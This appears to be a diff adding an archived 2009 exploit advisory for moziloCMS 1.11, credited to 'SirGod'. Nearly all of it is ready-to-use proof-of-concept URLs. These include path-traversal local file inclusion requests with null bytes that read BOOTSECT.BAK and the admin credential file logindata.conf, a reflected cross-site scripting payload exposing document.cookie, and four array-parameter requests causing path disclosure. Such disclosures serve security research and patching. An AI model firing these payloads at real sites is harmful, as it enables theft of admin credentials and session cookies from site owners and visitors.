@@ -1,0 +1,35 @@
+###############################################################################################
+[+] moziloCMS 1.11 (LFI/PD/XSS) Multiple Remote Vulnerabilites
+[+] Discovered By SirGod
+[+] www.mortal-team.org
+[+] www.h4cky0u.org
+###############################################################################################
+
+[+] Local File Inclusion
+
+ PoC 1 :
+
+   http://127.0.0.1/index.php?cat=10_Willkommen&page=../../../../../BOOTSECT.BAK%00
+
+ PoC 2 :
+
+   http://127.0.0.1/index.php?cat=10_Willkommen&page=../../admin/conf/logindata.conf%00
+
+[+] Cross Site Scripting
+
+ PoC :
+
+   http://127.0.0.1/index.php?action=search&query=<script>alert(document.cookie)</script>
+
+[+] Path Disclosure
+
+ PoC's :
+
+   http://127.0.0.1/gallery.php?gal[]=moziloCMS
+   http://127.0.0.1/index.php?cat=10_Willkommen&page[]=10_Willkommen
+   http://127.0.0.1/index.php?cat[]=10_Willkommen&page=10_Willkommen
+   http://127.0.0.1/download.php?cat=10_Willkommen&file[]=text.txt
+
+###############################################################################################
+
+# milw0rm.com [2009-04-10]
